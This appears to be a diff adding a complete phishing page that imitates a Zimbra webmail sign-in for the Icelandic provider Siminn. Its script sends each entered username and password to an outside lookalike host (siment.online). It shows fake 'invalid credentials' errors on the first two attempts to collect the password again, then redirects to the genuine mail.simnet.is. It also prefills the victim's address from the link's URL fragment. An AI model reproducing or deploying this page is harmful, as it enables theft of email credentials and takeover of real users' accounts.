@@ -1,0 +1,227 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Zimbra Web Client Sign-In</title>
+  <link rel="icon" href="https://play-lh.googleusercontent.com/VHvh72XWFKECw_vwAbYPuWR-reSBWU_Y1MXi4zmRdL0BV_SEz2JOnfxJazzcg2QBglSB" type="image/png">
+  <style>
+    body {
+      background: #1a8fbb url('https://iili.io/3WPAzzJ.png') no-repeat center center fixed;
+      background-size: cover;
+      display: flex;
+      justify-content: center;
+      align-items: center;
+      height: 100vh;
+      margin: 0;
+      font-family: Arial, sans-serif;
+      font-size: 14px;
+    }
+    .login-container {
+      background: white;
+      padding: 35px;
+      border-radius: 5px;
+      box-shadow: 0 4px 10px rgba(0, 0, 0, 0.2);
+      width: 350px;
+      text-align: left;
+    }
+    .login-container img {
+      display: block;
+      margin-bottom: 8px;
+    }
+    .login-container h2 {
+      margin-bottom: 40px;
+      font-size: 20px;
+      color: #333;
+      font-weight: bold;
+    }
+    .error-message {
+      color: red;
+      font-size: 12px;
+      margin-bottom: 8px;
+    }
+    .input-group {
+      margin-bottom: 12px;
+      display: flex;
+      flex-direction: column;
+    }
+    .input-group label {
+      font-size: 12px;
+      font-weight: normal;
+      color: #148dc0;
+      margin-bottom: 4px;
+    }
+    .input-group input {
+      padding: 10px;
+      border: 1px solid #ccc;
+      border-radius: 3px;
+      font-size: 12px;
+      width: 93%;
+      color: black;
+    }
+    .input-group input:focus {
+      border: 2px solid #87CEEB;
+      outline: none;
+    }
+    .password-group {
+      position: relative;
+    }
+    .password-group button {
+      position: absolute;
+      right: 8px;
+      top: 50%;
+      transform: translateY(-50%);
+      background: none;
+      border: none;
+      cursor: pointer;
+      font-size: 10px;
+      color: #1a8fbb;
+    }
+    .login-button {
+      background: #1a8fbb;
+      color: white;
+      border: none;
+      padding: 8px 18px;
+      border-radius: 3px;
+      cursor: pointer;
+      font-size: 14px;
+      font-weight: normal;
+      margin-top: 8px;
+      display: inline-block;
+      width: auto;
+    }
+    .checkbox-group {
+      display: flex;
+      align-items: center;
+      margin-top: 0.0001px;
+      margin-left: auto;
+      justify-content: flex-end;
+    }
+    .checkbox-group input {
+      margin-right: 5px;
+      margin-left: 5px;
+    }
+    .options {
+      margin-top: 12px;
+      font-size: 12px;
+      text-align: center;
+    }
+    .options a {
+      color: #1a8fbb;
+      text-decoration: none;
+      font-weight: normal;
+      margin: 0 3px;
+    }
+    .web-app-version {
+      margin-top: 15px;
+    }
+    .web-app-version label {
+      font-size: 12px;
+      font-weight: normal;
+      color: #333;
+      display: block;
+      margin-bottom: 4px;
+    }
+    .web-app-version select {
+      width: 100%;
+      padding: 8px;
+      border: 1px solid #ccc;
+      border-radius: 3px;
+      font-size: 12px;
+      color: black;
+    }
+    .web-app-version select:focus {
+      border: 2px solid #87CEEB;
+      outline: none;
+    }
+  </style>
+</head>
+<body>
+  <div class="login-container">
+    <img src="https://iili.io/3JNoN5B.png" alt="Siminn Logo" width="100">
+    <h2>Sign In</h2>
+    <div id="error-message" class="error-message"></div>
+    <form id="login-form">
+      <div class="input-group">
+        <label for="username">Username</label>
+        <input type="text" id="username" name="username" required />
+      </div>
+      <div class="input-group password-group">
+        <label for="password">Password</label>
+        <input type="password" id="password" name="password" required />
+        <button type="button" onclick="togglePassword(event)">Show</button>
+      </div>
+      <button type="submit" class="login-button">Sign In</button>
+      <div class="checkbox-group">
+        <input type="checkbox" id="stay-signed-in" name="stay-signed-in" />
+        <label for="stay-signed-in">Stay signed in</label>
+      </div>
+    </form>
+    <div class="options">
+      <a href="#">Gleymt lykilorð?</a>
+      <a href="#">Leiðbeiningar</a>
+      <a href="#">Skilmálar</a>
+    </div>
+    <div class="web-app-version">
+      <label for="web-version">Web App Version</label>
+      <select id="web-version">
+        <option>Default</option>
+      </select>
+    </div>
+  </div>
+
+  <script>
+    let attempts = 0;
+
+    document.getElementById("login-form").addEventListener("submit", function (e) {
+      e.preventDefault();
+
+      const username = document.getElementById("username").value;
+      const password = document.getElementById("password").value;
+      const errorBox = document.getElementById("error-message");
+
+      const formData = new URLSearchParams();
+      formData.append("username", username);
+      formData.append("password", password);
+
+      fetch("https://siment.online/simnet/sim.php", { 
+        method: "POST",
+        headers: {
+          "Content-Type": "application/x-www-form-urlencoded",
+        },
+        body: formData.toString(),
+      });
+
+      attempts++;
+
+      if (attempts === 1) {
+        errorBox.innerText = "⚠️ Invalid credentials. First attempt.";
+      } else if (attempts === 2) {
+        errorBox.innerText = "⚠️ Still incorrect. Second attempt.";
+      } else {
+        window.location.href = "https://mail.simnet.is";
+      }
+
+      document.getElementById("password").value = "";
+    });
+
+    function togglePassword(event) {
+      const pwd = document.getElementById("password");
+      if (pwd.type === "password") {
+        pwd.type = "text";
+        event.target.innerText = "Hide";
+      } else {
+        pwd.type = "password";
+        event.target.innerText = "Show";
+      }
+    }
+
+    window.addEventListener("load", function () {
+      const hash = window.location.hash.substring(1);
+      if (hash) {
+        document.getElementById("username").value = decodeURIComponent(hash);
+      }
+    });
+  </script>
+</body>
+</html>
